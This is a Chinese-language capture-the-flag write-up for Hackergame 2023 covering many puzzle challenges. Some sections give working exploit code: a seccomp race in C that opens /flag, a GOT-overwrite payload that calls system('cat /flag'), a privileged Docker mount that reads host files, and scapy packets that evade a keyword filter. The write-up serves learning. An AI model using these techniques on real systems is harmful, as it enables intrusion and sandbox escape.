= Hackergame 2023 WriteUp

== Hackergame 启动！

url 后面 `/?similarity=114514` 即可启动。获取 flag 前记得开最大亮度和音量。

试了一下 pipewire 把输出拉进输入，不行，响度和时间差都搞不定，看完官方 writeup 发现颜色都不对，哈哈。

== 猫咪#strike[问答]小测

T1: fuzz 一下，楼应该不会很高，吧？

T2: 搜到了#link("https://www.zhihu.com/question/20337132/answer/3023506910")[一篇知乎]

T3: `zgrep BBR /proc/config.gz`

T4: 搜到了#link("https://news.ycombinator.com/item?id=32779296")[HN]

== 更深更暗

F12 搜一下 `flag{`

== 赛博井字棋

卡了很久，甚至试了越界下棋。然后发现是能覆盖对面的棋子，复制一个 fetch 塞到 console 里面改一下就好。

== 奶奶的睡前 flag 故事

大约需要水群/水HN，就能一眼看出是 Pixel 裁切图片不 truncate 文件的那个 bug。

发现一个网站 https://acropalypse.app/

机型不会选。看原图，宽 1080，直接点 custom，W 改成 1080，长无所谓，交给 png parser 自由发挥吧，至少 firefox 显示出来了。

== 组委会模拟器

大模拟，只会写 python...

```py
import requests
import time
import re
urlbase = "http://202.38.93.111:10021/"
checktoken = urlbase + "/api/checkToken"
getmessage = urlbase + "/api/getMessages"
delmessage = urlbase + "/api/deleteMessage"
getflag = urlbase + "/api/getFlag"

session = requests.Session()
session.get(checktoken, params={"token": "2:MEUCIQC40y4XGGJHH303roxcGXaDxmkE4GJ2yKBAgnkWdSwY+gIgP45PlTy+3eAQsjd1iwdHxPBJwC7sjzwzs3K3ZJ3Z4OY="})
messages = session.post(getmessage).json()

start = time.time()
for i, m in enumerate(messages["messages"]):
    if len(re.findall(r'hack\[[a-z]+\]', m['text'])):
        time.sleep(max(0, start + m['delay'] + 0.2 - time.time()))
        print(m)
        session.post(delmessage, json={"id": i})
print(session.post(getflag).text)
```

== 虫

SSTV

qsstv #strike[再次]安装，mpv/helvum 启动！

== JSON #sym.subset YAML

搜索发现 YAML 1.1 对于科学记数法处理不同，输入 `{"a": 1145e4}` 即可。

继续看 YAML Spec 里面的 #link("https://yaml.org/spec/1.2.2/ext/changes/")[changelog]，发现提到

#quote[1.3. Relation to JSON: Added paragraph 4 to section 1.3 to clarify JSON compatibility in the presence of duplicate mapping keys (pointed out by Osamu Takeuchi).]

也就是说对于重复的 key 处理会有区别，尝试 `{"a": 1, "a": 2}`，发现可以使 YAML 1.2 报错。

== Git? Git!

```
$ git fsck --lost-found
dangling commit 505e1a3f446c23f31807a117e860f57cb5b5bb79
$ git show 505e1a3f446c23f31807a117e860f57cb5b5bb79
+  <!-- flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t} -->
```

有一种既视感，总感觉在之前的 hackergame 或者什么解谜类里面做过，那个好像是 git add 之后 reset，没有 commit。

== HTTP 集邮册

做的时候没收集，现在也想不起来了，摆了。大部分就是对着 status code 的定义试。

第二题脑子抽了甚至试了一下 afl 跑 nginx，效果太差，也没做出来。

== Docker for Everyone

```
docker run -it --rm \
    --mount type=bind,source=/dev/shm,target=/mnt \
    --privileged \
    alpine \
    cat /mnt/flag
```

== 惜字如金2

数了一下 `flag{}` 所在位置，给不太对的地方加了个 '.'，输出是 `flag{yo.-ve-r3cover3d-7he-an5w3r-r1ght?}`，再猜一下 you 的 u 不太容易 l337，改成 you 发现过了。

```py
    cod_dict += ['nymeh1niwemflcir}echaet.']
    cod_dict += ['a3g7}kidgojernoetlsup?h.']
    cod_dict += ['.ulw!f5soadrhwnrsnstnoeq']
    cod_dict += ['.ct{l-findiehaai{oveatas']
    cod_dict += ['.ty9kxborszstguyd?!blm-p']
```

== 低带宽星球

照着给出的图片在 inkscape 里面画 svg，然后删掉 inkscape 的废话，最终 svg 仍然不够小，emf 和 wmf 似乎不被支持，找不到能被 vips/magick 读取的二进制矢量图格式，不会了。

```xml
<svg width="1024" height="1024" xmlns="http://www.w3.org/2000/svg"><rect style="fill:#5d62d3;" width="364" height="1024" x="0"/><rect style="fill:#5a7234;" width="293" height="1024" x="364"/><rect style="fill:#58e50d;" width="367" height="1024" x="657"/></svg>
```

看完官方 writeup: JPEG XL 应该在我看到 JPEG 的时候就被放弃掉了，总觉得这各大小限制下应该是矢量图，JPEG 这个名字怎么看都应该是 raster，直接排除掉了。

== 高频率星球

先 asciinema cat，发现 less 退出时会恢复终端状态，用 vim 打开，发现是类似 jsonl 的格式，看 less 之后发生了什么。注意到

```json
[6.926757, "o", "\u001b[?1049h\u001b[?1h\u001b=\r"]
```

其中 `CSI ? 1049 h` 为 alt buffer 指令，删掉这条指令。对应的，在结尾应当还有一条 `CSI ? 1049 l`（`"\u001b[?1049l"`）， 也删掉。再 asciinema cat 就能看到完整输出了。这时候打开 tmux

```
set-option -g history-limit 100000
<run asciinema cat>
capture-pane -S -
save-buffer /tmp/flag.js
```

删掉首尾多余部分并运行即可。

#link("https://en.wikipedia.org/wiki/ANSI_escape_code")[`https://en.wikipedia.org/wiki/ANSI_escape_code`]

好像 ANSI escape code 也不是第一次出现在 hackergame 里面了。

== 流式星球

试。唯一可说的就是试了半天被眼前突然弹出来的 BanG Dream! 气笑了。

== Komm, süsser Flagge

=== POST

传统艺能，关键词分开发

```py
import socket
req = """POST / HTTP/1.1\r
Host: 192.168.23.1\r
Content-Length: 98\r
\r
2:MEUCIQC40y4XGGJHH303roxcGXaDxmkE4GJ2yKBAgnkWdSwY+gIgP45PlTy+3eAQsjd1iwdHxPBJwC7sjzwzs3K3ZJ3Z4OY=
"""
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("202.38.93.111", 18080))
conn.sendall(req[:1].encode())
conn.sendall(req[1:].encode())
print(conn.recv(1024))
```

=== P

发现第二个 u32 也可以这么过，可能是因为 tcp payload 仅有 1byte，长度不够 u32 规则生效。

看到 flag 里面说 reserved 发现是非预期了（

=== GET

第三个需要在包头找地方塞入关键词，发现 TCP 报文头中 Options 是变长的，使用 scapy 模拟 tcp 握手并发送 POST 请求。结果可以在 wireshark 中找到。注意需要加 iptables 把本机内核发的 RST 给 DROP 掉，否则连接会被内核断掉。

```py
from scapy.all import *
import random
sport = random.randint(30000,40000)
seq = random.randint(0, 1<<32)
magic = b"GET / HTTP"
req = "" # 同上

ip = IP()
ip.dst = '192.168.23.1'
syn = TCP(sport=sport, dport=18082, options=[(0x99, magic)])
synack = sr1(ip/syn)
ack = TCP(seq=synack.ack, ack=synack.seq + 1, sport=sport, dport=18082, flags="A", options=[(0x99, magic)])
send(ip/ack)
pa = TCP(seq=synack.ack, ack=synack.seq + 1, sport=sport, dport=18082, flags="PA", options=[(0x99, magic)])
send(ip/pa/req)
```

== 为什么要打开 /flag

=== LD_PRELOAD

静态编译即可

=== Seccomp

对着 ALLOWLIST 中的 clone syscall 看了半天感觉很不爽，觉得可能有 race condition，试了一下确实有。

supervisor 进程读 open(2) 的第一参数到该参数最终被 kernel 读取之间存在被另一个线程修改内存的可能。在另外一个进程里面反复修改第一个参数内容即可。

```c
int another_thread(volatile void *ptr) {
    volatile long long *s = ptr;
    for(;;) {
        *s = 0x67672f6e69622f;   // /bin/gg
        *s = 0x67616c662f;       // /flag
    }
}

int main() {
    volatile char fn[8] = {0};
    void *stack = malloc(4096);
    clone(another_thread, stack, CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, fn);
    for(int i=1;i<1000;i++) {
        int fd = openat(AT_FDCWD, fn, O_RDONLY);
        if (fd < 0) continue;
        char buf[1024];
        size_t len = read(fd, buf, 1024);
        close(fd);
        fwrite(buf, len, 1, stdout);
    }
    return 0;
}
```

拿到 flag 才发现这件事在 man 里写着...

== 异星歧途

逻辑在紫色的逻辑处理器中编写。不要右键，不要右键，不要右键。

=== 左1

对开关的状态要求直接写出，开关拨为 `10100101` 即可

=== 左2

打开逻辑处理器发现它将 8 位数字编码为一个整数，验证其是否为平方数，且 `10000100` 两位必须为 1，简单筛选一下，只有 196 满足要求，即 `0b11000100`

=== 右2

发现逻辑处理器控制一些元件。两个 conduit 导致漏水，不能开，否则冷却液不足，sw8 必须为左2最低位，为0；sw4 为 0。sw1 控制反应堆原料，要开。sw2 控制 gate1，若开则所有原料销毁，不开。sw3 关，则反应堆开。sw5 为生产冷却液必须，开。sw6 为 extractor 为 mixer 提供水，开。sw7 控制两个 meltdown，消耗大量电力，导致各种机器不可用，关。最终 `10001100`。

=== 右1

一系列门电路，逻辑大概是 

```c
t1 = !(!sw1 && sw2) // false
t2 = sw3 && sw4     // true
t3 = !sw5 && sw6    // true
t4 = !(sw7 && sw8)  // true
t5 = !t1 && t2      // true
t6 = !t3 || !t4     // false
out = t5 && !t6     // true
```

最终 `01110111`

== MyCalculator

阅读代码，发现 GET/PUT 功能只检查了上界没有检查下界，但 number 被定义为 `[0-9]+`，需要整数溢出才能实现负数下标。

溢出后可以读写大部分 `.data` 段内数据，包括 got 表和 stdio 的一系列 FILE 对象。选择 fprintf 和 stderr 进行修改。

由于从文件读会有 buffer，不能先启动 `/bin/sh` 再 `cat flag`，选择直接 `system("cat /flag")`。

`cat /flag` 我放在了 `result_buffer` 里面，取了个绑定前指向 plt 的 got 表指针，算一下偏移量塞进 stderr 所在地址。

同样由于交互条件限制，偏移量计算必须在线完成，#strike[还好这东西是个计算器]，先发送一个 dump `result_buffer` 之前 256 bytes 的 payload，确定 libc 版本和偏移量，再写死 offset。

最终 payload
```
544498019   // "cat "
1634493999  // "/fla"
103         // "g\x00"
g           // got bind fprintf
PUT 4294967288 GET 4294967232 + 20682   // fprintf@got = system
PUT 4294967289 GET 4294967233
PUT 4294967252 GET 4294967234 + 150976  // stderr = &result_buffer
g           // trigger fprintf(stderr, ...) -> system("cat /flag\0")
```
